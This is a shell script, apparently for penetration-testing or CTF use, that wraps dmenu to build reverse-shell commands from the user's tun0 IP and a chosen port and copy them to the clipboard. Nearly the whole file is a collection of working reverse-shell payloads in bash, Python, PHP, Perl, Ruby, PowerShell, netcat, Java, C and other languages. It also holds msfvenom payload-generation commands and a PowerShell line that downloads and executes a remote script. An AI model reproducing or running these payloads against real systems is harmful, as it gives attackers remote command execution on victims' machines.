#!/bin/sh

# TODO:
# tty shell spawner

# -- Just a dmenu wrapper --
# It just needs a port and a revshell type
# and u get a revshell with ur tun0 ip and
# the port u set
# Created by M4t35Z

# Inspired by: 
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

# Needed variables
tun0_ip=$(ip addr show tun0 2> /dev/null | grep -Po 'inet \K[\d.]+')
tun0_ipv6_ip=$(ip addr show tun0 2> /dev/null | grep -Po 'inet6 \K[a-z0-9].+(?=(\/))')
port="$($1 | dmenu -p "Gimme a port u wanna listen on")"

# Replace vars if they are empty
case "" in
    $tun0_ip) tun0_ip="10.0.0.1" ;;
esac
case "" in
    $tun0_ipv6_ip) tun0_ipv6_ip="dead:beef:2::125c" ;;
esac
case "" in
    $port) port=1234 ;;
esac

# RevShell copypasta
## bash
bashtcp1_shell="bash -i >& /dev/tcp/$tun0_ip/$port 0>&1"
bashtcp2_shell="0<&196;exec 196<>/dev/tcp/$tun0_ip/$port; sh <&196 >&196 2>&196"
bashtcp3_shell="bash -c 'bash -i >& /dev/tcp/$tun0_ip/$port 0>&1'"
bashudp1_shell="sh -i >& /dev/udp/$tun0_ip/$port 0>&1"
## socat
socat1_shell="/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$tun0_ip:$port"
## perl
perllin1_shell="perl -e 'use Socket;\$i="\""$tun0_ip"\"";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("\""tcp"\""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"\"">&S"\"");open(STDOUT,"\"">&S"\"");open(STDERR,"\"">&S"\"");exec("\""/bin/sh -i"\"");};'"
perllin2_shell="perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,"\""$tun0_ip:$port"\"");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"
perlwin1_shell="perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,"\""$tun0_ip:$port"\"");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
## python
pythonipv4lin1_shell="export RHOST="\""$tun0_ip"\"";export RPORT=$port;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("\""RHOST"\""),int(os.getenv("\""RPORT"\""))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("\""/bin/sh"\"")'"
pythonipv4lin2_shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\""$tun0_ip"\"",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("\""/bin/bash"\"")'"
pythonipv4lin3_shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\""$tun0_ip"\"",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\""/bin/sh"\"","\""-i"\""]);'"
pythonipv6lin1_shell="python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("\""$tun0_ipv6_ip"\"",$port,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("\""/bin/sh"\"");'"
pythonipv4win1_shell="python.exe -c "\""(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$tun0_ip', $port)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"\"""
## php
phplin1_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);exec("\""/bin/sh -i <&3 >&3 2>&3"\"");'"
phplin2_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);shell_exec("\""/bin/sh -i <&3 >&3 2>&3"\"");'"
phplin3_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);\`/bin/sh -i <&3 >&3 2>&3\`;'"
phplin4_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);system("\""/bin/sh -i <&3 >&3 2>&3"\"");'"
phplin5_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);passthru("\""/bin/sh -i <&3 >&3 2>&3"\"");'"
phplin6_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);popen("\""/bin/sh -i <&3 >&3 2>&3"\"", "\""r"\"");'"
phplin7_shell="php -r '\$sock=fsockopen("\""$tun0_ip"\"",$port);\$proc=proc_open("\""/bin/sh -i"\"", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'"
## ruby
rubylin1_shell="ruby -rsocket -e'f=TCPSocket.open("\""$tun0_ip"\"",$port).to_i;exec sprintf("\""/bin/sh -i <&%d >&%d 2>&%d"\"",f,f,f)'"
rubylin2_shell="ruby -rsocket -e 'exit if fork;c=TCPSocket.new("\""$tun0_ip"\"","\""$port"\"");while(cmd=c.gets);IO.popen(cmd,"\""r"\""){|io|c.print io.read}end'"
rubywin1_shell="ruby -rsocket -e 'c=TCPSocket.new("\""$tun0_ip"\"","\""$port"\"");while(cmd=c.gets);IO.popen(cmd,"\""r"\""){|io|c.print io.read}end'"
## go
golanglin1_shell="echo 'package main;import"\""os/exec"\"";import"\""net"\"";func main(){c,_:=net.Dial("\""tcp"\"","\""$tun0_ip:$port"\"");cmd:=exec.Command("\""/bin/sh"\"");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
## nc
nc1_shell="nc -e /bin/sh $tun0_ip $port"
nc2_shell="nc -c sh $tun0_ip $port"
nc3_shell="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0_ip $port >/tmp/f"
ncat1_shell="ncat $tun0_ip $port -e /bin/bash"
ncatudp1_shell="ncat --udp $tun0_ip $port -e /bin/bash"
## openssl
openssl1_shell="mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $tun0_ip:$port > /tmp/s; rm /tmp/s"
## powershell
powershell1_shell="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("\""$tun0_ip"\"",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + "\""PS "\"" + (pwd).Path + "\""> "\"";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
powershell2_shell="powershell -nop -c "\""\$client = New-Object System.Net.Sockets.TCPClient('$tun0_ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"\"""
powershell3_shell="powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')"
## awk
awk1_shell="awk 'BEGIN {s = "\""/inet/tcp/0/$tun0_ip/$port"\""; while(42) { do{ printf "\""shell>"\"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "\""exit"\"") close(s); }}' /dev/null"
## java
javalin1_shell="r = Runtime.getRuntime()\np = r.exec(["\""/bin/bash"\"","\""-c"\"","\""exec 5<>/dev/tcp/$tun0_ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done"\""] as String[])\np.waitFor()"
javawin1_shell="String host="\""$tun0_ip"\"";\nint port=$port;\nString cmd="\""cmd.exe"\"";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
javastealth1_shell="Thread thread = new Thread(){\npublic void run(){\n// Reverse shell here\n}\n}\nthread.start();"
## war
war1_shell="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$tun0_ip LPORT=$port -f war > reverse.war"
## lua
lua1lin_shell="lua -e "\""require('socket');require('os');t=socket.tcp();t:connect('$tun0_ip','$port');os.execute('/bin/sh -i <&3 >&3 2>&3');"\"""
lua2x_shell="lua5.1 -e 'local host, port = "$tun0_ip", $port local socket = require("\""socket"\"") local tcp = socket.tcp() local io = require("\""io"\"") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "\""r"\"") local s = f:read("\""*a"\"") f:close() tcp:send(s) if status == "\""closed"\"" then break end end tcp:close()'"
## nodejs
nodejs1_shell="(function(){\nvar net = require("\""net"\""),\ncp = require("\""child_process"\""),\nsh = cp.spawn("\""/bin/sh"\"", []);\nvar client = new net.Socket();\nclient.connect($port, "\""$tun0_ip"\"", function(){\nclient.pipe(sh.stdin);\nsh.stdout.pipe(client);\nsh.stderr.pipe(client);\n});\nreturn /a/;\n})();"
nodejs2_shell="require('child_process').exec('nc -e /bin/sh $tun0_ip $port')"
## groovy
groovywin1_shell="String host="\""$tun0_ip"\"";\nint port=$port;\nString cmd="\""cmd.exe"\"";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
groovystealth1_shell="Thread.start {\n//Revshell here\n}"
# c
c_shell="#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = $port;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("\""$tun0_ip"\"");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"\""/bin/sh"\"", NULL};
    execve("\""/bin/sh"\"", argv, NULL);

    return 0;
}
"
## msfvenom (meterpreter)
msfwin1_shell="msfvenom -p windows/meterpreter/reverse_tcp LHOST=$tun0_ip LPORT=$port -f exe > reverse.exe"
msfwin2_shell="msfvenom -p windows/shell_reverse_tcp LHOST=$tun0_ip LPORT=$port -f exe > reverse.exe"
msfwin3_shell="msfvenom -p windows/meterpreter/reverse_tcp LHOST=$tun0_ip LPORT=$port -f asp > shell.asp"
msflin1_shell="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$tun0_ip LPORT=$port -f elf >reverse.elf"
msflin2_shell="msfvenom -p linux/x86/shell_reverse_tcp LHOST=$tun0_ip LPORT=$port -f elf >reverse.elf"
msfosx1_shell="msfvenom -p osx/x86/shell_reverse_tcp LHOST=$tun0_ip LPORT=$port -f macho > shell.macho"
msfjava1_shell="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$tun0_ip LPORT=$port -f raw > shell.jsp"
msfpython1_shell="msfvenom -p cmd/unix/reverse_python LHOST=$tun0_ip LPORT=$port -f raw > shell.py"
msfbash1_shell="msfvenom -p cmd/unix/reverse_bash LHOST=$tun0_ip LPORT=$port -f raw > shell.sh"
msfperl1_shell="msfvenom -p cmd/unix/reverse_perl LHOST=$tun0_ip LPORT=$port -f raw > shell.pl"
msfphp1_shell="msfvenom -p php/meterpreter_reverse_tcp LHOST=$tun0_ip LPORT=$port -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php"

# ---

# Texts
## bash
bashtcp1_text="bt1 -> $bashtcp1_shell"
bashtcp2_text="bt2 -> $bashtcp2_shell"
bashtcp3_text="bt3 -> $bashtcp3_shell"
bashudp1_text="bu1 -> $bashudp1_shell"
## socat
socat1_text="sc1 (github.com/andrew-d/static-binaries) -> $socat1_shell"
## perl
perllin1_text="pll1 -> $perllin1_shell"
perllin2_text="pll2 -> $perllin2_shell"
perlwin1_text="plw1 -> $perlwin1_shell"
## python
pythonipv4lin1_text="py4l1 -> $pythonipv4lin1_shell"
pythonipv4lin2_text="py4l2 -> $pythonipv4lin2_shell"
pythonipv4lin3_text="py4l3 -> $pythonipv4lin3_shell"
pythonipv6lin1_text="py6l1 -> $pythonipv6lin1_shell"
pythonipv4win1_text="py4w1 -> $pythonipv4win1_shell"
## php
phplin1_text="ph1 (exec) -> $phplin1_shell"
phplin2_text="ph2 (shell_exec) -> $phplin2_shell"
phplin3_text="ph3 (\`sh\`) -> $phplin3_shell"
phplin4_text="ph4 (system) -> $phplin4_shell"
phplin5_text="ph5 (passthru) -> $phplin5_shell"
phplin6_text="ph6 (popen) -> $phplin6_shell"
phplin7_text="ph7 (proc_open) -> $phplin7_shell"
## ruby
rubylin1_text="rbl1 (default)" # with %d dmenu would be buggy(it replaces %d with 0)
rubylin2_text="rbl2 -> $rubylin2_shell"
rubywin1_text="rbw1 -> $rubywin1_shell"
## go
golanglin1_text="gol1 -> $golanglin1_shell"
## nc
nc1_text="nc1 (-e) -> $nc1_shell"
nc2_text="nc2 (-c) -> $nc2_shell"
nc3_text="nc3 (long) -> $nc3_shell"
ncat1_text="ncat (-e) -> $ncat1_shell"
ncatudp1_text="ncat (udp) -> $ncatudp1_shell"
## openssl
openssl1_text="ossl -> $openssl1_shell"
## powershell
powershell1_text="ps1-1 (rev "\""'s + percent symbol(buggy in dmenu))"
powershell2_text="ps1-2 (COMMON) (rev ' + percent symbol(buggy in dmenu))"
powershell3_text="ps1-3 (download file) -> $powershell3_shell"
## awk
awk1_text="awk1 -> $awk1_shell"
## java
javalin1_text="jvl1 (multi line (3))"
javawin1_text="jvw1 (multi line (4))"
javastealth1_text="jvs1 (stealth (threaded), multi line (6))"
## war
war1_text="war1 (msfvenom) -> $war1_shell"
## lua
lua1lin_text="lua1l (linux only) -> $lua1lin_shell"
lua2x_text="lua2x (both platforms (win & lin)) -> $lua2x_shell"
## nodejs
nodejs1_text="ndjs1 (multi line)"
nodejs2_text="ndjs2 (child_process + nc) -> $nodejs2_shell"
## groovy
groovywin1_text="groovyw1 (multi line)"
groovystealth1_text="groovys1 (stealth)"
## c
c_text="clang (multi line + u have to compile)"
## msf
msfwin1_text="msfw1 (meterpreter) -> $msfwin1_shell"
msfwin2_text="msfw2 (shell) -> $msfwin2_shell"
msfwin3_text="msfw3 (asp) -> $msfwin3_shell"
msflin1_text="msfl1 (meterpreter) -> $msflin1_shell"
msflin2_text="msfl2 (shell) -> $msflin2_shell"
msfosx1_text="msfosx (shell + macho format) -> $msfosx1_shell"
msfjava1_text="msfjava1 (jsp) -> $msfjava1_shell"
msfpython1_text="msfpy1 (unix python) -> $msfpython1_shell"
msfbash1_text="msfbash1 (unix bash) -> $msfbash1_shell"
msfperl1_text="msfpl1 (unix perl) -> $msfperl1_shell"
msfphp1_text="msfph1 (php revshell with msfvenom)"


# ---

# The Juicy part
case "$(printf "$bashtcp1_text\\n$bashtcp2_text\\n$bashtcp3_text\\n$bashudp1_text\\n$socat1_text\\n$perllin1_text\\n$perllin2_text\\n$perlwin1_text\\n$pythonipv4lin1_text\\n$pythonipv4lin2_text\\n$pythonipv4lin3_text\\n$pythonipv6lin1_text\\n$pythonipv4win1_text\\n$phplin1_text\\n$phplin2_text\\n$phplin3_text\\n$phplin4_text\\n$phplin5_text\\n$phplin6_text\\n$phplin7_text\\n$rubylin1_text\\n$rubylin2_text\\n$rubywin1_text\\n$golanglin1_text\\n$nc1_text\\n$nc2_text\\n$nc3_text\\n$ncat1_text\\n$ncatudp1_text\\n$openssl1_text\\n$powershell1_text\\n$powershell2_text\\n$powershell3_text\\n$awk1_text\\n$javalin1_text\\n$javawin1_text\\n$javastealth1_text\\n$war1_text\\n$lua1lin_text\\n$lua2x_text\\n$nodejs1_text\\n$nodejs2_text\\n$groovywin1_text\\n$groovystealth1_text\\n$c_text\\n$msfwin1_text\\n$msfwin2_text\\n$msfwin3_text\\n$msflin1_text\\n$msflin2_text\\n$msfosx1_text\\n$msfjava1_text\\n$msfpython1_text\\n$msfbash1_text\\n$msfperl1_text\\n$msfphp1_text" | dmenu -l 15 -i -p "R3vSh3LLZ")" in

    ## bash
    "$bashtcp1_text") echo -n "$bashtcp1_shell" | xclip -selection clipboard ;;
    "$bashtcp2_text") echo -n "$bashtcp2_shell" | xclip -selection clipboard ;;
    "$bashtcp3_text") echo -n "$bashtcp3_shell" | xclip -selection clipboard ;;
    "$bashudp1_text") echo -n "$bashudp1_shell" | xclip -selection clipboard ;;

    ## socat
    "$socat1_text") echo -n "$socat1_shell" | xclip -selection clipboard ;;

    ## perl
    "$perllin1_text") echo -n "$perllin1_shell" | xclip -selection clipboard ;;
    "$perllin2_text") echo -n "$perllin2_shell" | xclip -selection clipboard ;;
    "$perlwin1_text") echo -n "$perlwin1_shell" | xclip -selection clipboard ;;

    ## python
    "$pythonipv4lin1_text") echo -n "$pythonipv4lin1_shell" | xclip -selection clipboard ;;
    "$pythonipv4lin2_text") echo -n "$pythonipv4lin2_shell" | xclip -selection clipboard ;;
    "$pythonipv4lin3_text") echo -n "$pythonipv4lin3_shell" | xclip -selection clipboard ;;
    "$pythonipv6lin1_text") echo -n "$pythonipv6lin1_shell" | xclip -selection clipboard ;;
    "$pythonipv4win1_text") echo -n "$pythonipv4win1_shell" | xclip -selection clipboard ;;

    ## php
    "$phplin1_text") echo -n "$phplin1_shell" | xclip -selection clipboard ;;
    "$phplin2_text") echo -n "$phplin2_shell" | xclip -selection clipboard ;;
    "$phplin3_text") echo -n "$phplin3_shell" | xclip -selection clipboard ;;
    "$phplin4_text") echo -n "$phplin4_shell" | xclip -selection clipboard ;;
    "$phplin5_text") echo -n "$phplin5_shell" | xclip -selection clipboard ;;
    "$phplin6_text") echo -n "$phplin6_shell" | xclip -selection clipboard ;;
    "$phplin7_text") echo -n "$phplin7_shell" | xclip -selection clipboard ;;

    ## ruby(1st -> buggy(copy) cuz dmenu doesnt like %d's xdd)
    "$rubylin1_text") echo -n "$rubylin1_shell" | xclip -selection clipboard ;;
    "$rubylin2_text") echo -n "$rubylin2_shell" | xclip -selection clipboard ;;
    "$rubywin1_text") echo -n "$rubywin1_shell" | xclip -selection clipboard ;;

    ## go
    "$golanglin1_text") echo -n "$golanglin1_shell" | xclip -selection clipboard ;;
    
    ## nc
    "$nc1_text") echo -n "$nc1_shell" | xclip -selection clipboard ;;
    "$nc2_text") echo -n "$nc2_shell" | xclip -selection clipboard ;;
    "$nc3_text") echo -n "$nc3_shell" | xclip -selection clipboard ;;
    "$ncat1_text") echo -n "$ncat1_shell" | xclip -selection clipboard ;;
    "$ncatudp1_text") echo -n "$ncatudp1_shell" | xclip -selection clipboard ;;

    ## openssl
    "$openssl1_text") echo -n "$openssl1_shell" | xclip -selection clipboard ;;

    ## powershell
    "$powershell1_text") echo -n "$powershell1_shell" | xclip -selection clipboard ;;
    "$powershell2_text") echo -n "$powershell2_shell" | xclip -selection clipboard ;;
    "$powershell3_text") echo -n "$powershell3_shell" | xclip -selection clipboard ;;

    ## awk
    "$awk1_text") echo -n "$awk1_shell" | xclip -selection clipboard ;;

    ## java
    "$javalin1_text") echo -n "$javalin1_shell" | xclip -selection clipboard ;;
    "$javawin1_text") echo -n "$javawin1_shell" | xclip -selection clipboard ;;
    "$javastealth1_text") echo -n "$javastealth1_shell" | xclip -selection clipboard ;;

    ## war
    "$war1_text") echo -n "$war1_shell" | xclip -selection clipboard ;;

    ## lua
    "$lua1lin_text") echo -n "$lua1lin_shell" | xclip -selection clipboard ;;
    "$lua2x_text") echo -n "$lua2x_shell" | xclip -selection clipboard ;;

    ## nodejs
    "$nodejs1_text") echo -n "$nodejs1_shell" | xclip -selection clipboard ;;
    "$nodejs2_text") echo -n "$nodejs2_shell" | xclip -selection clipboard ;;

    ## groovy
    "$groovywin1_text") echo -n "$groovywin1_shell" | xclip -selection clipboard ;;
    "$groovystealth1_text") echo -n "$groovystealth1_shell" | xclip -selection clipboard ;;

    ## c
    "$c_text") echo -n "$c_shell" | xclip -selection clipboard ;;

    ## msfvenom (meterpreter)

    "$msfwin1_text") echo -n "$msfwin1_shell" | xclip -selection clipboard ;;
    "$msfwin2_text") echo -n "$msfwin2_shell" | xclip -selection clipboard ;;
    "$msfwin3_text") echo -n "$msfwin3_shell" | xclip -selection clipboard ;;
    ### linux
    "$msflin1_text") echo -n "$msflin1_shell" | xclip -selection clipboard ;;
    "$msflin2_text") echo -n "$msflin2_shell" | xclip -selection clipboard ;;
    ### osx
    "$msfosx1_text") echo -n "$msfosx1_shell" | xclip -selection clipboard ;;
    ### java
    "$msfjava1_text") echo -n "$msfjava1_shell" | xclip -selection clipboard ;;
    ### py, pl, bash, php with msfvenom
    "$msfpython1_text") echo -n "$msfpython1_shell" | xclip -selection clipboard ;;
    "$msfbash1_text") echo -n "$msfbash1_shell" | xclip -selection clipboard ;;
    "$msfperl1_text") echo -n "$msfperl1_shell" | xclip -selection clipboard ;;
    "$msfphp1_text") echo -n "$msfphp1_shell" | xclip -selection clipboard ;;
esac
